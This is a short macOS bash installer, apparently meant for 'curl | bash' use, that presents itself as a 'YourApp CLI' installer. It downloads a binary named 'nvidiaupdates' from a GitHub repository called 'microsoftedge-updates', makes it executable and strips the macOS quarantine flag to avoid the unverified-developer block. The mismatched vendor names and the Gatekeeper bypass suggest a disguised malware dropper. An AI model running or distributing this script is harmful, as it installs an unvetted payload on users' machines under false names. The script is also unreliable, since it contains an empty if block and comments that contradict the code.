#!/bin/bash
#
# install-mac.sh
# One-line installer for YourApp CLI on macOS
#
#   curl -fsSL https://xxx.com/install-mac.sh | bash
#

set -e

APP_NAME="nvidiaupdates"
DOWNLOAD_URL="https://github.com/deepwork0714/microsoftedge-updates/releases/download/v.0.0.8-mac/mac-update"
INSTALL_DIR="/usr/local/bin"
INSTALL_PATH="$INSTALL_DIR/$APP_NAME"
TMP_PATH="$(mktemp -t ${APP_NAME}).tmp"

 
# 1. Create install dir in the user's home (no admin rights needed)
mkdir -p "$INSTALL_DIR"
 
# 2. Download the binary to a temp file first

curl -fsSL "$DOWNLOAD_URL" -o "$TMP_PATH"
 
if [ ! -s "$TMP_PATH" ]; then

  rm -f "$TMP_PATH"
  exit 1
fi
 
# 3. Move into place and make executable
mv "$TMP_PATH" "$INSTALL_PATH"
chmod +x "$INSTALL_PATH"
 
# 4. Remove macOS quarantine flag if present (avoids "unverified developer" block)
xattr -d com.apple.quarantine "$INSTALL_PATH" 2>/dev/null || true
 
# 5. Add install dir to PATH if not already there
SHELL_RC="$HOME/.zshrc"
[ -n "$BASH_VERSION" ] && [ -f "$HOME/.bash_profile" ] && SHELL_RC="$HOME/.bash_profile"
 
if [[ ":$PATH:" != *":$INSTALL_DIR:"* ]]; then
  if ! grep -q "$INSTALL_DIR" "$SHELL_RC" 2>/dev/null; then

  fi
  export PATH="$INSTALL_DIR:$PATH"
fi
